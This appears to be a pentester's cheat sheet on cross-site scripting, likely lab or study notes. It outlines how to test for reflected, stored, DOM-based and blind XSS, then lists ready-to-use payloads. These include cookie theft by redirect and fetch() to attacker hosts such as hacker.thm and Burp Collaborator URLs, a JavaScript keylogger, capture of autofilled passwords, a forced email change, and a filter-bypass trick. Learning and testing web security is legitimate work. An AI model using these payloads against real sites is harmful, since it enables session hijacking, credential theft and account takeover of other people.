   ###  XSS
  - How to test for Reflected XSS:

You'll need to test every possible point of entry; these include:

    Parameters in the URL Query String
    URL File Path
    Sometimes HTTP Headers (although unlikely exploitable in practice)
  - How to test for Stored XSS:

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

    Comments on a blog
    User profile information
    Website Listings
  - How to test for Dom Based XSS:


DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.


When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().

  - How to test for Blind XSS:


When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.


A popular tool for Blind XSS attacks is xsshunter. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
  - To get cookie <script>document.location="attacker-domain"+document.cookie</script>, and then check log
  - If html injection, but script not alerting maybe use payload <iframe src="javascript:alert(`xss`)">
  - session stealing <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
  - Key Logger:<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
  - Business Logic: <script>user.changeEmail('attacker@hacker.thm');</script>
  - bypass script string replace <sscriptcript>alert('THM');</sscriptcript>
  - on image tag, /images/cat.jpg" onload="alert('THM');

### XSS payload
 - steal cookies<script>
fetch("https://28871y2murqilrzo0kexuhsd74du1j.burpcollaborator.net",{
method:"POST","mode": "no-cors", body:document.cookie,
})
</script>
 - steal password autofill <input name=user id=user>
<input name=pass id=pass 
onchange="if(this.value.length)fetch('https://f4kkxbyzq4mvh4v1wxaaquoq3h99xy.burpcollaborator.net', {method: 'POST', mode:'no-cors',body: user.value+' '+this.value}),">

# DOM XSS
 - https://youtu.be/5OiWO5Qr-iI
